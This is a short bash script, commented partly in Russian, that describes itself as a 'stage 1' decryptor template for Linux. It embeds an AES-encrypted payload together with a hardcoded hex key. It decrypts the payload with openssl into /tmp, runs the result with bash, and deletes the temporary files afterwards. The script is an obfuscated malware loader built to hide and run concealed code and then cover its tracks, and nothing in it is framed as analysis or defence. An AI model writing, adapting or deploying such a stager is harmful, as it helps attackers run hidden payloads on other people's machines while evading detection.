#!/bin/bash
# AES-256-CBC decryptor template for Linux stage 1

PAYLOAD="68d5e05c7b9d27579eaa78c4ddda50d3:FcvRAvFzslLvi7is3zl8ztCqctlkx8DxhfaKiBT8DMmnxDk6W+bkosIMnlb8ldZQQVScCOD1O6qFCGK9EtLAEgtyDrpzcr//28Mvjqe8nqTIz17O1G5NLnFX7kzcDAMJ1KSKZ7BX2wIW5L+j2DHCqaF9H7oP/BJVD/zWjIbWWlnWr2WfTjZTaHVrFZ4lliZ99gFs6AmTXMF0slkdoqTKMkAoVx8pPjWA1b1wEtaWmgYIGO7Jad6/rcv9zdYydT6eUe7uyLn7D68enaOkYPQ6QgOPY0qIoEBaXL5yl0WMpzkRr01JEvp8vvPoILnKhSW3T0LIAvkCSBMKUVmnH79M8SDnnjOugCoirlTl6Qme+rHKAwriC7VBl80baLwDg+BH0E2SVjpOe/JwN/Q1F1ReNRRz99kl943ltYq0y1f9aHcTlu0SezkylH5oQsoyIxgGYNjZhD+ActhG/emnz/3wwjGqLSf6PX94B6TTjOdFheM="  # encrypted ivhex:base64cipher, вставится на сборке
KEY="5a786376626e6d313233343536373839305a786376626e6d3132333435363738"      # AES ключ в HEX, совпадает с .env ENCRYPTION_KEY

iv=$(echo "$PAYLOAD" | cut -d: -f1)
cipher=$(echo "$PAYLOAD" | cut -d: -f2)

# Декодируем base64 в бинарник
echo "$cipher" | base64 -d > /tmp/cipher.bin

# Расшифровываем с помощью openssl (ключ уже в HEX, без конвертаций)
openssl enc -d -aes-256-cbc -K "$KEY" -iv "$iv" -in /tmp/cipher.bin -out /tmp/plaintext.sh

# Запускаем payload
bash /tmp/plaintext.sh

# Удаляем временные файлы
rm -f /tmp/cipher.bin /tmp/plaintext.sh
